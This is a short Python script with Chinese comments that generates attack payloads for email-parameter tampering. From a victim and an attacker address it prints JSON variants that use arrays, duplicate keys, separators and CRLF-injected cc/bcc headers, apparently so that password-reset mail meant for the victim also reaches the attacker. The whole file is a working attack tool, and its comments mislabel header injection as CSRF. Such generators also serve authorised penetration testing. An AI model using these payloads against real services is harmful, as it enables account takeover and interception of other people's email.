import argparse
import json

def generate_payload(victim_email, attacker_email):
    payload = {}

    # 使用数组
    # {"email":["victim@mail.com","attacker@mail.com"]}
    print('{"email": ["%s", "%s"]}'% (victim_email, attacker_email))

    # 使用逗号分割
    # {"email":"Victim@gmail.com,Attacker@gmail.com","email":"Victim@gmail.com"}    
    print('{"email": "%s,%s", "email": "%s"}' % (victim_email, attacker_email, victim_email))
    # {"email":"Victim@gmail.com","email":"Victim@gmail.com,Attacker@gmail.com"}
    print('{"email": "%s", "email": "%s,%s"}' % (victim_email, victim_email, attacker_email))

    # 使用分好分割
    # {"email":"Victim@gmail.com;Attacker@gmail.com","email":"Victim@gmail.com"}
    print('{"email": "%s;%s", "email": "%s"}' % (victim_email, attacker_email, victim_email))
    # {"email":"Victim@gmail.com","email":"Victim@gmail.com;Attacker@gmail.com"}
    print('{"email": "%s", "email": "%s;%s"}' % (victim_email, victim_email, attacker_email))

    # 使用空格分割
    # {"email":"Victim@gmail.com%20Attacker@gmail.com","email":"Victim@gmail.com"}
    print('{"email": "%s%s%s", "email": "%s"}' % (victim_email, "%20", attacker_email, victim_email))
    # {"email":"Victim@gmail.com","email":"Victim@gmail.com%20Attacker@gmail.com"}
    print('{"email": "%s", "email": "%s%s%s"}' % (victim_email, victim_email, "%20", attacker_email))

    # Linux: CSRF分割%0a，cc抄送
    # {"email":"Victim@mail.com%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
    print('{"email": "%s%scc:%s", "email": "%s"}' % (victim_email, "%0A", attacker_email, victim_email))
    # {"email":"Victim@mail.com","email":"Victim@mail.com%0Acc:Attacker@mail.com"}
    print('{"email": "%s", "email": "%s%scc:%s"}' % (victim_email, victim_email, "%0A", attacker_email))

    # Linux: CSRF分割%0a, bcc暗抄送
    # {"email": "Victim@mail.com%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
    print('{"email": "%s%sbcc:%s", "email": "%s"}' % (victim_email, "%0A", attacker_email, victim_email))
    # {"email":"Victim@mail.com","email":"Victim@mail.com%0Abcc:Attacker@mail.com"}
    print('{"email": "%s", "email": "%s%sbcc:%s"}' % (victim_email, victim_email, "%0A", attacker_email))

    # Windows: CSRF分割%0d%0a, cc抄送
    # {"email":"Victim@mail.com%0D%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
    print('{"email": "%s%scc:%s", "email": "%s"}' % (victim_email, "%0d%0a", attacker_email, victim_email))
    # {"email":"Victim@mail.com","email":"Victim@mail.com%0D%0Acc:Attacker@mail.com"}
    print('{"email": "%s", "email": "%s%scc:%s"}' % (victim_email, victim_email, "%0d%0a", attacker_email))

    # Windows: CSRF分割%0d%0a, bcc暗抄送
    # {"email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
    print('{"email": "%s%sbcc:%s", "email": "%s"}' % (victim_email, "%0d%0a", attacker_email, victim_email))
    # {"email":"Victim@mail.com","email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com"}
    print('{"email": "%s", "email": "%s%sbcc:%s"}' % (victim_email, victim_email, "%0d%0a", attacker_email))

    # \r\n分割
    # {"email":"Victim@mail.com\r\n \ncc: Attacker@mail.com","email":"Victim@mail.com"}
    print('{"email": "%s\\r\\n \\ncc: %s", "email": "%s"}' % (victim_email, attacker_email, victim_email))
    # {"email":"Victim@mail.com","email":"Victim@mail.com\r\n \ncc: Attacker@mail.com"}
    print('{"email": "%s", "email": "%s\\r\\n \\ncc: %s"}' % (victim_email, victim_email, attacker_email))

def main():
    parser = argparse.ArgumentParser(description='生成攻击payload')
    parser.add_argument('-attack', metavar='攻击者邮箱', type=str, help='攻击者的邮箱')
    parser.add_argument('-victim', metavar='受害者邮箱', type=str, help='受害者的邮箱')

    args = parser.parse_args()

    if args.attack and args.victim:
        generate_payload(args.victim, args.attack)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
